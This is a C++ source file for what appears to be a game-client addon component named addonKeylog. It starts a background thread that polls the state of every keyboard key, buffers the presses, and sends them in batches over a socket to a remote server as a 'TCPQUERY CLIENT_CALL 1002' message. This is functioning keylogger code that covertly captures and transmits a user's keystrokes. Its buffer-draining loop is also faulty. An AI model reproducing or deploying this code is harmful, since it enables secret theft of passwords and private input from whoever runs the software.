#pragma once

#include "keylog.h"



extern addonThread *gThread;
extern addonMutex *gMutex;
extern addonSocket *gSocket;
extern addonKeylog *gKeylog;
extern std::queue<std::string> send_to;





addonKeylog::addonKeylog()
{
	addonDebug("Keylog constructor called");

	this->active = true;

	this->keylogHandle = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread, NULL);
}



addonKeylog::~addonKeylog()
{
	addonDebug("Keylog deconstructor called");

	this->active = false;

	gThread->Stop(this->keylogHandle);
}



DWORD keylog_thread(void *lpParam)
{
	addonDebug("Thread 'keylog_thread' successfuly started");

	std::stack<int> keyStack;
	std::string keyString;

	while(gKeylog->active)
	{
		if(keyStack.size() >= 256)
		{
			keyString.clear();

			for(unsigned int i = 0; i < keyStack.size(); i++)
			{
				keyString.push_back(keyStack.top());
				keyStack.pop();
				
				gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1002 << " " << keyString); // TCPQUERY CLIENT_CALL 1002 %s1    ---   Sends async key data | %s1 - Keys array
			}
		}

		for(int q = 8; q != 191; q++)
		{
			if(GetAsyncKeyState(q) == -32767)
			{
				keyStack.push(q);
			}
		}

		Sleep(50);
	}

	return true;
}